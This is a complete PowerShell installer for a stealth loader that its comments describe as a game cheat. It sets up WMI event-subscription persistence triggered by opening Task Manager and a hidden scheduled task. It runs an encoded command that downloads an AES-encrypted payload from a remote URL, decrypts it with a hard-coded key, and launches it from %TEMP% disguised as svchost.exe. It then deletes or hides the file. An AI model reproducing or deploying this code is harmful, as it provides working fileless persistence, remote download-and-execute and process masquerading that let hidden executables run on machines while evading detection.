# install.ps1
#
# One-time setup: registers a persistent WMI event subscription that fires
# every time Taskmgr.exe starts. When it fires, a hidden PowerShell command
# is launched by the WMI service; that command downloads an encrypted
# payload from a URL you control, decrypts it in memory with a hard-coded
# AES-256 key, and spawns the resulting exe from a per-session temp
# directory (which is then deleted the moment the exe hands the handle
# back). The cheat file never sits on disk between sessions - the WMI
# subscription is the only persistent artifact.
#
# Usage:
#   Run as admin (script self-elevates):
#       powershell.exe -EP Bypass -File install.ps1
#
#   Uninstall (removes the WMI subscription):
#       powershell.exe -EP Bypass -File install.ps1 -Uninstall
#
#   Status (shows current registration):
#       powershell.exe -EP Bypass -File install.ps1 -Status
#
# Before running install: build the payload (build_payload.ps1) and upload
# the resulting payload.bin somewhere HTTP GET-able, then paste that URL
# into $PAYLOAD_URL below.

[CmdletBinding()]
param(
    [switch]$Uninstall,
    [switch]$Status,
    [string]$Key  # optional; if omitted the installer prompts
)

# ============================================================================
# EDIT THIS BEFORE FIRST INSTALL
# ============================================================================

# Auth-mode (recommended once the Cloudflare Worker is deployed) - the
# loader posts { key, hwid } to /auth/check and only proceeds when the
# server hands back a valid payload URL + AES key. Neither of those ever
# has to live on the user's machine.
$AUTH_ENDPOINT = 'https://trentoz-auth.YOUR-SUBDOMAIN.workers.dev'

# Direct-mode FALLBACK - used only while $AUTH_ENDPOINT still has the
# placeholder above (i.e. before you deploy the Worker). Lets you test
# rebuilds against a plain hosted payload.bin without an auth backend.
# Once the Worker is up, edit $AUTH_ENDPOINT above and these two are
# ignored - no need to reinstall clients.
$DIRECT_PAYLOAD_URL = 'https://raw.githubusercontent.com/janneshannes839-art/resource/main/payload.bin'
$DIRECT_AES_KEY_HEX = 'b4f27a91d3e8c5062f89147a3bd6fe5c98e7013a4c6d8f2b1a5e9037d2c48b60'

# Where the installed loader remembers the user's key (auth mode only).
# ProtectedData (DPAPI, per-user) - a copy-paste of the value from
# another account can't be reused.
$KEY_REG_PATH = 'HKCU:\Software\trentoz'
$KEY_REG_NAME = 'K'

# Are we in auth mode? True when the Worker URL is set to something real.
$USE_AUTH = ($AUTH_ENDPOINT -notmatch 'YOUR-SUBDOMAIN' -and $AUTH_ENDPOINT -match '^https?://')

# ============================================================================
# Configurable but usually fine as-is
# ============================================================================

# Which process's start fires the loader. Taskmgr.exe is the default because
# opening task manager is a normal user action that happens often enough to
# be your session start and rare enough that you don't spam the loader.
# Anything with a fixed exe name works: notepad.exe, calc.exe, mspaint.exe.
$TRIGGER_EXE = 'Taskmgr.exe'

# WMI object names. Change if you want to run multiple cheats side by side.
$FILTER_NAME   = 'trentoz_TaskmgrFilter'
$CONSUMER_NAME = 'trentoz_TaskmgrLoader'
$TASK_NAME     = 'trentoz_Loader'

# ----------------------------------------------------------------------------

$ErrorActionPreference = 'Stop'

function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-SelfElevate {
    $args = @('-NoProfile', '-EP', 'Bypass', '-File', "`"$PSCommandPath`"")
    if ($Uninstall) { $args += '-Uninstall' }
    if ($Status)    { $args += '-Status' }
    if ($Key)       { $args += @('-Key', "`"$Key`"") }
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList $args
    exit
}

function Remove-WmiObjects {
    # Best-effort cleanup. Silently continues if the objects aren't there.
    $ns = 'root\subscription'

    Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue |
        Where-Object { $_.Filter -like "*Name=`"$FILTER_NAME`"*" -or $_.Consumer -like "*Name=`"$CONSUMER_NAME`"*" } |
        ForEach-Object { $_.Delete() | Out-Null }

    Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$CONSUMER_NAME'" -EA SilentlyContinue |
        ForEach-Object { $_.Delete() | Out-Null }

    Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='$FILTER_NAME'" -EA SilentlyContinue |
        ForEach-Object { $_.Delete() | Out-Null }
}

function Remove-ScheduledLoaderTask {
    try {
        Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -EA SilentlyContinue
    } catch { }
}

# Purges the ShakeV1_* / HKCU\Software\ShakeV1 artefacts a pre-rename
# install would have left behind. Runs on every install and uninstall so
# people who upgraded across the rename don't end up with two sets of
# leftover state.
function Remove-LegacyState {
    $legacyFilter   = 'ShakeV1_TaskmgrFilter'
    $legacyConsumer = 'ShakeV1_TaskmgrLoader'
    $legacyTask     = 'ShakeV1_Loader'
    $legacyRegPath  = 'HKCU:\Software\ShakeV1'
    $ns = 'root\subscription'

    try {
        Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue |
            Where-Object {
                $_.Filter   -like "*Name=`"$legacyFilter`"*" -or
                $_.Consumer -like "*Name=`"$legacyConsumer`"*"
            } | ForEach-Object { $_.Delete() | Out-Null }

        Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer `
            -Filter "Name='$legacyConsumer'" -EA SilentlyContinue |
            ForEach-Object { $_.Delete() | Out-Null }

        Get-WmiObject -Namespace $ns -Class __EventFilter `
            -Filter "Name='$legacyFilter'" -EA SilentlyContinue |
            ForEach-Object { $_.Delete() | Out-Null }
    } catch { }

    try {
        Unregister-ScheduledTask -TaskName $legacyTask -Confirm:$false -EA SilentlyContinue
    } catch { }

    try {
        if (Test-Path $legacyRegPath) {
            # Nuke the whole subtree (stored key + configs sub-key etc).
            Remove-Item -Path $legacyRegPath -Recurse -Force -EA SilentlyContinue
        }
    } catch { }
}

function Get-InteractiveUser {
    # UAC self-elevation keeps the same user account (just adds admin
    # privileges), so the elevated process's identity is the interactive
    # user. Fall back to $env:USERNAME if the WindowsIdentity name isn't
    # in DOMAIN\User form for whatever reason.
    $id = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($id -and $id -match '\\') { return $id }
    return "$env:USERDOMAIN\$env:USERNAME"
}

function Show-Status {
    $ns = 'root\subscription'
    $f  = Get-WmiObject -Namespace $ns -Class __EventFilter            -Filter "Name='$FILTER_NAME'"   -EA SilentlyContinue
    $c  = Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$CONSUMER_NAME'" -EA SilentlyContinue
    $b  = Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue |
          Where-Object { $_.Filter -like "*Name=`"$FILTER_NAME`"*" }
    $t  = Get-ScheduledTask -TaskName $TASK_NAME -EA SilentlyContinue

    $keyStored = $false
    try { $keyStored = ((Get-ItemProperty -Path $KEY_REG_PATH -Name $KEY_REG_NAME -EA SilentlyContinue).$KEY_REG_NAME) -ne $null } catch { }

    "Filter          : $(if ($f) {'present'} else {'absent'})"
    "Consumer        : $(if ($c) {'present'} else {'absent'})"
    "Binding         : $(if ($b) {'present'} else {'absent'})"
    "Scheduled task  : $(if ($t) {'present (runs as '+ $t.Principal.UserId +')'} else {'absent'})"
    "License key     : $(if ($keyStored) {'stored (DPAPI)'} else {'MISSING'})"
    "Trigger exe     : $TRIGGER_EXE"
    "Auth endpoint   : $AUTH_ENDPOINT"
}

# ---- Elevation gate ---------------------------------------------------------

if (-not (Test-Admin)) {
    Write-Host 'Need admin - re-launching elevated...'
    Invoke-SelfElevate
}

# ---- Status mode ------------------------------------------------------------

if ($Status) {
    Show-Status
    Write-Host ''
    Write-Host 'Press any key to close...'
    [void][Console]::ReadKey($true)
    exit 0
}

# ---- Uninstall mode ---------------------------------------------------------

if ($Uninstall) {
    Remove-WmiObjects
    Remove-ScheduledLoaderTask
    Remove-LegacyState
    try {
        if (Test-Path $KEY_REG_PATH) {
            # Nuke the whole trentoz subtree (stored creds + configs).
            Remove-Item -Path $KEY_REG_PATH -Recurse -Force -EA SilentlyContinue
        }
    } catch { }
    Write-Host 'Uninstalled - WMI trigger, scheduled task, legacy state, and stored creds removed.'
    Write-Host 'Press any key to close...'
    [void][Console]::ReadKey($true)
    exit 0
}

# ---- Sanity checks + key handling (auth mode only) --------------------------

if ($USE_AUTH) {
    if (-not $Key) {
        Write-Host ''
        Write-Host 'Enter your license key (format: XXXXX-XXXXX-XXXXX-XXXXX):'
        $Key = Read-Host 'key'
    }
    $Key = $Key.Trim().ToUpper()
    if ($Key -notmatch '^[A-Z0-9]{4,6}(-[A-Z0-9]{4,6}){2,5}$') {
        Write-Error "That doesn't look like a valid key - expected something like XXXXX-XXXXX-XXXXX-XXXXX."
        exit 1
    }

    # DPAPI-encrypt the key with the current user's scope. Anyone signed
    # in as a different user (including admin on another account) can't
    # decrypt the stored value; it's only usable by the loader running
    # under this same user account.
    Add-Type -AssemblyName System.Security
    $plainBytes = [Text.Encoding]::UTF8.GetBytes($Key)
    $protBytes  = [System.Security.Cryptography.ProtectedData]::Protect(
        $plainBytes, $null,
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $b64Key     = [Convert]::ToBase64String($protBytes)

    if (-not (Test-Path $KEY_REG_PATH)) { New-Item -Path $KEY_REG_PATH -Force | Out-Null }
    Set-ItemProperty -Path $KEY_REG_PATH -Name $KEY_REG_NAME -Value $b64Key -Type String

    Write-Host 'Key stored (DPAPI-encrypted, per-user scope).' -ForegroundColor Green
}
else {
    # Direct mode: sanity-check the placeholders got replaced.
    if ($DIRECT_PAYLOAD_URL -notmatch '^https?://' -or $DIRECT_PAYLOAD_URL -match 'YOUR_HOST') {
        Write-Error 'Direct mode: set $DIRECT_PAYLOAD_URL to the URL that serves your payload.bin.'
        exit 1
    }
    if ($DIRECT_AES_KEY_HEX.Length -ne 64) {
        Write-Error 'Direct mode: $DIRECT_AES_KEY_HEX must be 64 hex chars.'
        exit 1
    }
    Write-Host 'Running in DIRECT mode (no auth backend yet).' -ForegroundColor Yellow
    Write-Host 'For production: deploy the Cloudflare Worker and set $AUTH_ENDPOINT.' -ForegroundColor Yellow
}

# ---- Build the loader script (runs at trigger fire, in-memory) --------------

# This is the PowerShell that WMI will invoke every time TRIGGER_EXE opens.
# It:
#   1. Takes a named mutex - if another loader/cheat is already active in
#      this session, exits immediately (no double-loading);
#   2. Downloads the encrypted payload from PAYLOAD_URL;
#   3. AES-256-CBC decrypts using the embedded key (first 16 bytes = IV);
#   4. Writes the decrypted PE to a per-session random directory under %TEMP%,
#      named svchost.exe so Task Manager shows a familiar name;
#   5. Starts the process hidden;
#   6. Best-effort deletes the temp file after launch;
#   7. Waits for the cheat process to exit before releasing the mutex, so
#      a second Taskmgr open during the session doesn't spawn a duplicate.

$loaderScript = if ($USE_AUTH) { @"
`$ErrorActionPreference = 'SilentlyContinue'
try {
    `$mutex = New-Object System.Threading.Mutex(`$false, 'Global\trentoz_Loader_v1')
    if (-not `$mutex.WaitOne(0)) { return }
    try {
        # ---- read + decrypt stored key ----------------------------------
        `$b64 = (Get-ItemProperty -Path '$KEY_REG_PATH' -Name '$KEY_REG_NAME' -EA Stop).'$KEY_REG_NAME'
        Add-Type -AssemblyName System.Security | Out-Null
        `$prot  = [Convert]::FromBase64String(`$b64)
        `$plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
            `$prot, `$null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        `$licKey = [Text.Encoding]::UTF8.GetString(`$plain)

        # ---- collect HWID -----------------------------------------------
        # Combines BIOS + baseboard + first-CPU + system-drive serials so
        # a swap of any one component still recognises the machine but a
        # totally different PC does not. Hashed with SHA-256 so the wire
        # value can never be reversed to the underlying serials.
        function _wmi(`$c) { try { (Get-CimInstance -ClassName `$c -EA Stop) } catch { `$null } }
        `$parts = @()
        `$b = _wmi 'Win32_BIOS';       if (`$b) { `$parts += `$b.SerialNumber }
        `$m = _wmi 'Win32_BaseBoard';  if (`$m) { `$parts += `$m.SerialNumber }
        `$c = _wmi 'Win32_Processor';  if (`$c) { `$parts += (`$c | Select-Object -First 1).ProcessorId }
        `$d = _wmi 'Win32_DiskDrive';  if (`$d) { `$parts += (`$d | Where-Object { `$_.Index -eq 0 } | Select-Object -First 1).SerialNumber }
        `$fp   = (`$parts | Where-Object { `$_ } | ForEach-Object { `$_.ToString().Trim() }) -join '|'
        if (-not `$fp) { `$fp = "`$env:COMPUTERNAME|`$env:USERDOMAIN|`$env:PROCESSOR_IDENTIFIER" }
        `$sha  = [System.Security.Cryptography.SHA256]::Create()
        `$hb   = `$sha.ComputeHash([Text.Encoding]::UTF8.GetBytes(`$fp))
        `$hwid = -join (`$hb | ForEach-Object { '{0:x2}' -f `$_ })
        `$sha.Dispose()

        # ---- auth to the Worker -----------------------------------------
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        `$body = @{ key = `$licKey; hwid = `$hwid } | ConvertTo-Json -Compress
        `$auth = `$null
        try {
            `$auth = Invoke-RestMethod -Uri '$AUTH_ENDPOINT/auth/check' `
                -Method Post -ContentType 'application/json' -Body `$body -TimeoutSec 10
        } catch { return }
        if (-not `$auth -or -not `$auth.valid) { return }
        if (-not `$auth.payload_url -or -not `$auth.aes_key) { return }

        # ---- download + decrypt payload ---------------------------------
        `$keyHex = `$auth.aes_key
        if (`$keyHex.Length -ne 64) { return }
        `$aesKey = New-Object byte[] 32
        for (`$i = 0; `$i -lt 32; `$i++) {
            `$aesKey[`$i] = [Convert]::ToByte(`$keyHex.Substring(`$i * 2, 2), 16)
        }
        `$wc   = New-Object Net.WebClient
        `$blob = `$wc.DownloadData(`$auth.payload_url)
        if (`$blob.Length -le 32) { return }
        `$iv = New-Object byte[] 16
        [Buffer]::BlockCopy(`$blob, 0, `$iv, 0, 16)
        `$ct = New-Object byte[] (`$blob.Length - 16)
        [Buffer]::BlockCopy(`$blob, 16, `$ct, 0, `$ct.Length)
        `$aes = [System.Security.Cryptography.Aes]::Create()
        `$aes.KeySize = 256
        `$aes.Key = `$aesKey
        `$aes.IV  = `$iv
        `$aes.Mode = 'CBC'
        `$aes.Padding = 'PKCS7'
        `$dec = `$aes.CreateDecryptor()
        `$pt  = `$dec.TransformFinalBlock(`$ct, 0, `$ct.Length)
        `$aes.Dispose()

        # ---- spawn cheat -------------------------------------------------
        `$sub = [Guid]::NewGuid().ToString('N').Substring(0, 8)
        `$dir = Join-Path `$env:TEMP `$sub
        [void][IO.Directory]::CreateDirectory(`$dir)
        `$exe = Join-Path `$dir 'svchost.exe'
        [IO.File]::WriteAllBytes(`$exe, `$pt)

        # Give the cheat process what it needs to display the license
        # panel - a masked key + expiry the loader just verified. Env
        # vars are only inherited by the immediate child, so nothing
        # else on the box sees these values.
        `$mask = `$licKey
        if (`$mask.Length -gt 10) {
            `$mask = `$mask.Substring(0, 5) + '-*****-*****-' + `$mask.Substring(`$mask.Length - 5)
        }
        `$env:SHAKE_LIC_KEY_MASK    = `$mask
        `$env:SHAKE_LIC_EXPIRES     = if (`$auth.expires_at)  { [string]`$auth.expires_at }  else { '0' }
        `$env:SHAKE_LIC_REMAINING_S = if (`$auth.remaining_s) { [string]`$auth.remaining_s } else { '0' }

        `$proc = Start-Process -FilePath `$exe -PassThru

        # Wipe the env vars from OUR process so they're not observable
        # after the child inherits them.
        Remove-Item Env:SHAKE_LIC_KEY_MASK    -EA SilentlyContinue
        Remove-Item Env:SHAKE_LIC_EXPIRES     -EA SilentlyContinue
        Remove-Item Env:SHAKE_LIC_REMAINING_S -EA SilentlyContinue
        Start-Sleep -Milliseconds 1500
        try { Remove-Item `$exe -Force } catch {
            try { `$a = Get-Item `$exe; `$a.Attributes = 'Hidden,System' } catch { }
        }
        if (`$proc) { `$proc.WaitForExit() }
        try { Remove-Item `$dir -Recurse -Force } catch { }
    } finally {
        `$mutex.ReleaseMutex()
        `$mutex.Dispose()
    }
} catch { }
"@
} else { @"
`$ErrorActionPreference = 'SilentlyContinue'
try {
    `$mutex = New-Object System.Threading.Mutex(`$false, 'Global\trentoz_Loader_v1')
    if (-not `$mutex.WaitOne(0)) { return }
    try {
        # ---- direct-mode download ---------------------------------------
        `$url = '$DIRECT_PAYLOAD_URL'
        `$keyHex = '$DIRECT_AES_KEY_HEX'
        `$aesKey = New-Object byte[] 32
        for (`$i = 0; `$i -lt 32; `$i++) {
            `$aesKey[`$i] = [Convert]::ToByte(`$keyHex.Substring(`$i * 2, 2), 16)
        }
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        `$wc   = New-Object Net.WebClient
        `$blob = `$wc.DownloadData(`$url)
        if (`$blob.Length -le 32) { return }
        `$iv = New-Object byte[] 16
        [Buffer]::BlockCopy(`$blob, 0, `$iv, 0, 16)
        `$ct = New-Object byte[] (`$blob.Length - 16)
        [Buffer]::BlockCopy(`$blob, 16, `$ct, 0, `$ct.Length)
        `$aes = [System.Security.Cryptography.Aes]::Create()
        `$aes.KeySize = 256
        `$aes.Key = `$aesKey
        `$aes.IV  = `$iv
        `$aes.Mode = 'CBC'
        `$aes.Padding = 'PKCS7'
        `$dec = `$aes.CreateDecryptor()
        `$pt  = `$dec.TransformFinalBlock(`$ct, 0, `$ct.Length)
        `$aes.Dispose()

        # ---- spawn cheat -------------------------------------------------
        `$sub = [Guid]::NewGuid().ToString('N').Substring(0, 8)
        `$dir = Join-Path `$env:TEMP `$sub
        [void][IO.Directory]::CreateDirectory(`$dir)
        `$exe = Join-Path `$dir 'svchost.exe'
        [IO.File]::WriteAllBytes(`$exe, `$pt)

        # Direct mode has no license info to pass - cheat's License panel
        # will read "not injected via loader" (accurate - no server auth
        # happened, no license bounds to display).
        `$proc = Start-Process -FilePath `$exe -PassThru

        Start-Sleep -Milliseconds 1500
        try { Remove-Item `$exe -Force } catch {
            try { `$a = Get-Item `$exe; `$a.Attributes = 'Hidden,System' } catch { }
        }
        if (`$proc) { `$proc.WaitForExit() }
        try { Remove-Item `$dir -Recurse -Force } catch { }
    } finally {
        `$mutex.ReleaseMutex()
        `$mutex.Dispose()
    }
} catch { }
"@
}

# UTF-16LE + Base64 encode for -EncodedCommand.
$bytes = [Text.Encoding]::Unicode.GetBytes($loaderScript)
$b64   = [Convert]::ToBase64String($bytes)

# ---- Wipe any previous install and rebuild ---------------------------------

Remove-WmiObjects
Remove-ScheduledLoaderTask
Remove-LegacyState

# ---- Scheduled Task: runs the loader in the INTERACTIVE user's session ----
#
# WMI's CommandLineEventConsumer fires as SYSTEM in session 0 - a process
# spawned there has no user desktop to render on, so the cheat's overlay
# window never becomes visible even though the exe is running. Fix: WMI
# only asks Task Scheduler to run this task, and the task itself is
# registered under the interactive user with LogonType Interactive. That
# means the loader (and the cheat it spawns) live in session 1+, on the
# real user desktop, and the overlay appears normally.

$interactiveUser = Get-InteractiveUser

$taskAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $b64"

$taskPrincipal = New-ScheduledTaskPrincipal `
    -UserId $interactiveUser `
    -LogonType Interactive `
    -RunLevel Highest

$taskSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -MultipleInstances IgnoreNew `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

# No triggers - fires only when WMI runs `schtasks /run` below.
Register-ScheduledTask `
    -TaskName $TASK_NAME `
    -Action $taskAction `
    -Principal $taskPrincipal `
    -Settings $taskSettings `
    -Force | Out-Null

# ---- WMI subscription: kicks the scheduled task on Taskmgr open ----

$ns = 'root\subscription'

# __EventFilter: WQL that fires within 1 second of a matching process start.
$filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
    Name           = $FILTER_NAME
    EventNamespace = 'root\cimv2'
    QueryLanguage  = 'WQL'
    Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 1 " +
                     "WHERE TargetInstance ISA 'Win32_Process' " +
                     "AND TargetInstance.Name = '$TRIGGER_EXE'"
}

# CommandLineEventConsumer: just tells Task Scheduler to run our task.
# The task itself is what has the payload logic, and the task runs as
# the interactive user - so session-0 isolation stops being an issue.
$consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
    Name                = $CONSUMER_NAME
    CommandLineTemplate = "schtasks.exe /run /tn `"$TASK_NAME`""
}

# __FilterToConsumerBinding: ties the two together.
Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $filter
    Consumer = $consumer
} | Out-Null

Write-Host ''
Write-Host 'Install OK.' -ForegroundColor Green
Write-Host "Mode           : $(if ($USE_AUTH) {'AUTH (Worker-gated)'} else {'DIRECT (URL fallback)'})"
Write-Host "Trigger        : $TRIGGER_EXE"
if ($USE_AUTH) {
    Write-Host "Auth endpoint  : $AUTH_ENDPOINT"
    Write-Host "License key    : $Key"
} else {
    Write-Host "Payload URL    : $DIRECT_PAYLOAD_URL"
}
Write-Host "WMI filter     : $FILTER_NAME"
Write-Host "WMI consumer   : $CONSUMER_NAME"
Write-Host "Scheduled task : $TASK_NAME  (runs as $interactiveUser)"
Write-Host ''
Write-Host 'Open Task Manager once to verify the cheat loads.'
Write-Host 'Run  install.ps1 -Uninstall  to remove.'
Write-Host ''
Write-Host 'Press any key to close...'
[void][Console]::ReadKey($true)
